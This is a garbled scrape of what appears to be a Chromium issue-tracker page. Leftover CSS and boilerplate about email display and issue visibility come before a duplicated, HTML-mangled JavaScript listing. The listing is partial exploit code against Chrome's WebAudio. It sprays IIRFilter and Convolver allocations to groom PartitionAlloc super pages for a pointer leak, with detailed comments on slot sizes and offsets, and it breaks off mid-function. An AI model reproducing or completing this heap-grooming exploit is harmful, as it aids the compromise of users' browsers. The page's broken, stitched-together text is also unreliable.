 delete loadQueue;

  /** Converts a <button> to look like an <a> tag. */
  .linkify {
    display: inline;
    padding: 0;
    margin: 0;
    border: 0;
    background: 0;
    cursor: pointer;
  }
  h1, h2, h3, h4 {
    background: none;
  }
  a, chops-button, a.button, .button, .linkify {
    color: var(--chops-link-color);
    text-decoration: none;
    font-weight: var(--chops-link-font-weight);
    font-family: var(--chops-font-family);
  }
  a:hover, .linkify:hover {
    text-decoration: underline;
  }
  a.button, .button {
    /* Links that look like buttons. */
    display: inline-flex;
    align-items: center;
    justify-content: center;
    text-decoration: none;
    transition: filter 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
  }
  a.button:hover, .button:hover {
    filter: brightness(95%);
  }
  chops-button, a.button, .button {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
    background: var(--chops-white);
    border-radius: 6px;
    --chops-button-padding: 0.25em 8px;
    margin: 0;
    margin-left: auto;
  }
  a.button, .button {
    padding: var(--chops-button-padding);
  }
  chops-button i.material-icons, a.button i.material-icons, .button i.material-icons {
    display: block;
    margin-right: 4px;
  }
  chops-button.emphasized, a.button.emphasized, .button.emphasized {
    background: var(--chops-primary-button-bg);
    color: var(--chops-primary-button-color);
    text-shadow: 1px 1px 3px hsla(0, 0%, 0%, 0.25);
  }
  textarea, select, input {
    box-sizing: border-box;
    font-size: var(--chops-main-font-size);
  }
  /* Note: decoupling heading levels from styles is useful for
  * accessibility because styles will not always line up with semantically
  * appropriate heading levels.
  */
  .medium-heading {
    font-size: var(--chops-large-font-size);
    font-weight: normal;
    line-height: 1;
    padding: 0.25em 0;
    color: var(--chops-link-color);
    margin: 0;

    border-bottom: var(--chops-normal-border);
  }

    line-height: 1.6;
  }
  .input-grid {
    padding: 0.5em 0;
    display: grid;
    max-width: 100%;

    align-items: flex-start;
  }
  .input-grid label {

    .input-grid {

    }
  }

        }

          width: 100%;

Email display settings

<h2>Email display settings</h2>



        

There is a 

setting

<a href="/hosting/settings">setting</a>

 to control how
        your email address appears on comments and issues that you post.

<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>



        

Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.

<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>



        

If you do not wish your email address to be shared, there
        are other ways to 

get
        involved

<a href="http://www.chromium.org/getting-involved">get
        involved</a>

 in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.

This site hosts public issues in public projects

<h2>This site hosts public issues in public projects</h2>



        

Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.

<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>



        

Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.

<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

<span class="line"><!---->function ReverseBigInt(Val) {<!----></span>



<br>





    let ReversedVal = BigInt(0);



<span class="line"><!---->    let ReversedVal = BigInt(0);<!----></span>



<br>





    let TempVal = Val;



<span class="line"><!---->    let TempVal = Val;<!----></span>



<br>





 



<span class="line"><!----> <!----></span>



<br>





    for (let i = 0; i < 8; i++) {



<span class="line"><!---->    for (let i = 0; i &lt; 8; i++) {<!----></span>



<br>





        ReversedVal = ReversedVal << BigInt(8);



<span class="line"><!---->        ReversedVal = ReversedVal &lt;&lt; BigInt(8);<!----></span>



<br>





        ReversedVal += TempVal & BigInt(0xFF);



<span class="line"><!---->        ReversedVal += TempVal &amp; BigInt(0xFF);<!----></span>



<br>





        TempVal = TempVal >> BigInt(8);



<span class="line"><!---->        TempVal = TempVal &gt;&gt; BigInt(8);<!----></span>



<br>





    }



<span class="line"><!---->    }<!----></span>



<br>





 



<span class="line"><!----> <!----></span>



<br>





    return ReversedVal;



<span class="line"><!---->    return ReversedVal;<!----></span>



<br>





}

function FeedforwardHeapGroom() { 



<span class="line"><!---->function FeedforwardHeapGroom() { <!----></span>



<br>





    let TempAudioCtx = new OfflineAudioContext(1, 48000 * 100, 48000);



<span class="line"><!---->    let TempAudioCtx = new OfflineAudioContext(1, 48000 * 100, 48000);<!----></span>



<br>





    let FeedforwardArray = new Float64Array(2); // 0x30 allocation. Size may be adjusted: 20 = 0xa0 size. 20 is max. Does not influence contained data.



<span class="line"><!---->    let FeedforwardArray = new Float64Array(2); // 0x30 allocation. Size may be adjusted: 20 = 0xa0 size. 20 is max. Does not influence contained data.<!----></span>



<br>





    let FeedbackArray = new Float64Array(1); // Has no effect on allocation size but directly influences contained data.



<span class="line"><!---->    let FeedbackArray = new Float64Array(1); // Has no effect on allocation size but directly influences contained data.<!----></span>



<br>





 



<span class="line"><!----> <!----></span>



<br>





    // Spray 0x30 allocations into the FastAlloc Extent (Super Page 1/2). The debug egg can be used to locate this Extent in memory.



<span class="line"><!---->    // Spray 0x30 allocations into the FastAlloc Extent (Super Page 1/2). The debug egg can be used to locate this Extent in memory.<!----></span>



<br>





 



<span class="line"><!----> <!----></span>



<br>





    FeedbackArray[0] = DebugEgg; // Modifying this value controls the data at offset 0x18 of the 0x30 slot. Value from 0xeeeeeeee egg: 1f 1a eb 47 92 24 f1 bd 0xbdf1249247eb1a1f



<span class="line"><!---->    FeedbackArray[0] = DebugEgg; // Modifying this value controls the data at offset 0x18 of the 0x30 slot. Value from 0xeeeeeeee egg: 1f 1a eb 47 92 24 f1 bd 0xbdf1249247eb1a1f<!----></span>



<br>





    FeedforwardArray[0] = 0; // Changing these feedforward values has no affect on memory at leaked ptr



<span class="line"><!---->    FeedforwardArray[0] = 0; // Changing these feedforward values has no affect on memory at leaked ptr<!----></span>



<br>





    FeedforwardArray[1] = -1;



<span class="line"><!---->    FeedforwardArray[1] = -1;<!----></span>



<br>





 



<span class="line"><!----> <!----></span>



<br>





    for (let i = 0; i < (256 * 1); i++) { // The 0x30 slot span will typically fall on Partition Page 27 of the first Super Page of the FastMalloc Extent when these IIR filtrs are creatd directly after page initialization.



<span class="line"><!---->    for (let i = 0; i &lt; (256 * 1); i++) { // The 0x30 slot span will typically fall on Partition Page 27 of the first Super Page of the FastMalloc Extent when these IIR filtrs are creatd directly after page initialization.<!----></span>

        IIRFilters.push(TempAudioCtx.createIIRFilter(FeedforwardArray, FeedbackArray));



<span class="line"><!---->        IIRFilters.push(TempAudioCtx.createIIRFilter(FeedforwardArray, FeedbackArray));<!----></span>



<br>





    }



<span class="line"><!---->    }<!----></span>



<br>





 



<span class="line"><!----> <!----></span>



<br>





    // Clog the free 0x240 slots in the first Super Page of the FastAlloc Extent: chrome_child!blink::BackgroundHTMLParser::Create+0x2f triggers an 0x230 during init which causess an 0x240 slot span to be created in the first Super Page. 



<span class="line"><!---->    // Clog the free 0x240 slots in the first Super Page of the FastAlloc Extent: chrome_child!blink::BackgroundHTMLParser::Create+0x2f triggers an 0x230 during init which causess an 0x240 slot span to be created in the first Super Page. <!----></span>



<br>





 



<span class="line"><!----> <!----></span>



<br>





    let Bucket240Slots = 62; // 63 will cause one additional 0x240 alloc in the final Super Page (44), resulting in a potential issue with delta from leaked pointer. 61 and lower will consistently crash.



<span class="line"><!---->    let Bucket240Slots = 62; // 63 will cause one additional 0x240 alloc in the final Super Page (44), resulting in a potential issue with delta from leaked pointer. 61 and lower will consistently crash.<!----></span>



<br>





 



<span class="line"><!----> <!----></span>



<br>





    for(var x = 0; x < Bucket240Slots; x++) { // Size 0x240 slot spans have 64 slots in them. This count ensures the 0x240 slot span in the first Super Page will be clogged. Only 1 alloc (of size 0x230) will be present in 0x240 slot span.



<span class="line"><!---->    for(var x = 0; x &lt; Bucket240Slots; x++) { // Size 0x240 slot spans have 64 slots in them. This count ensures the 0x240 slot span in the first Super Page will be clogged. Only 1 alloc (of size 0x230) will be present in 0x240 slot span.<!----></span>

        TempConvolver = TempAudioCtx.createConvolver();



<span class="line"><!---->        TempConvolver = TempAudioCtx.createConvolver();<!----></span>

<span class="line"><!---->        AudioBuf = TempAudioCtx.createBuffer(1, 0x10, 48000);<!----></span>

        TempConvolver.buffer = AudioBuf;



<span class="line"><!---->        TempConvolver.buffer = AudioBuf;<!----></span>

<span class="line"><!---->        GcPreventer.push(AudioBuf);<!----></span>

        GcPreventer.push(TempConvolver);



<span class="line"><!---->        GcPreventer.push(TempConvolver);<!----></span>

    }

<span class="line"><!----> <!----></span>



<br>





    // Allocs of 0x240 will fall into a slot span on Super Page 43. However, 0x200 will fall in to 42. Spray 32 0x200 allocs to create/clog a slot span on Super Page 42 to ensure this does not happen.



<span class="line"><!---->    // Allocs of 0x240 will fall into a slot span on Super Page 43. However, 0x200 will fall in to 42. Spray 32 0x200 allocs to create/clog a slot span on Super Page 42 to ensure this does not happen.<!----></span>

<span class="line"><!----> <!----></span>

    let Bucket200Slots = 36; // An extra couple slot allocs in case there are open slots <= 42 which may sink hole the desired memory leak pointer from SetBuffer. Too many of these allocs may push the leaked pointer into 44 though, so this is a delicate balance.



<span class="line"><!---->    let Bucket200Slots = 36; // An extra couple slot allocs in case there are open slots &lt;= 42 which may sink hole the desired memory leak pointer from SetBuffer. Too many of these allocs may push the leaked pointer into 44 though, so this is a delicate balance.<!----></span>

    for(var x = 0; x < (Bucket200Slots / 2); x++) {

        TempConvolver = TempAudioCtx.createConvolver(); // Each convolver triggers 2 FastZeroedMalloc of size 0x200. So 16 are needed to clog a slot span of 32 slots (which is universally the default 0x200 size)



<span class="line"><!---->        TempConvolver = TempAudioCtx.createConvolver(); // Each convolver triggers 2 FastZeroedMalloc of size 0x200. So 16 are needed to clog a slot span of 32 slots (which is universally the default 0x200 size)<!----></span>

}
